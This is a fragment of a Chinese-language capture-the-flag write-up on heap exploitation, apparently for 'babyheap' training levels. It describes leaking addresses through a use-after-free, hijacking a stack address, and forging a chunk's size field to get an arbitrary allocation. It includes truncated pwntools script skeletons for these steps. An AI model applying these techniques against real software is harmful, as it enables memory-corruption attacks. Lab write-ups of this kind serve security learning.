...
通过**fork函数调用echo命令时，会申请一个内存块，里面分别存放了程序地址，栈地址，堆地址，可借助uaf泄露地址，劫持栈地址完成利用**<br>
```python
from pwn import *
context.log_level = 'debug'
context.os = 'linux'
...
前提条件：**能够写我们想要分配的内存地址的前0x8字节，我们就能通过伪造chunk->size，完成free，并malloc该地址**<br>
```python
from pwn import *
context.log_level = 'debug'
context.os = 'linux'
...
binary_path = "./babyheap_level12.0"
libc_path = "./libc.so.6"

p = process(binary_path)

def malloc(idx,size):
    p.recvuntil(b"[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/stack_malloc_win/quit): ")
    p.sendline(b"malloc")
    p.recvuntil(b"Index: ")
    p.sendline(str(idx).encode())
    p.recvuntil(b"Size: ")
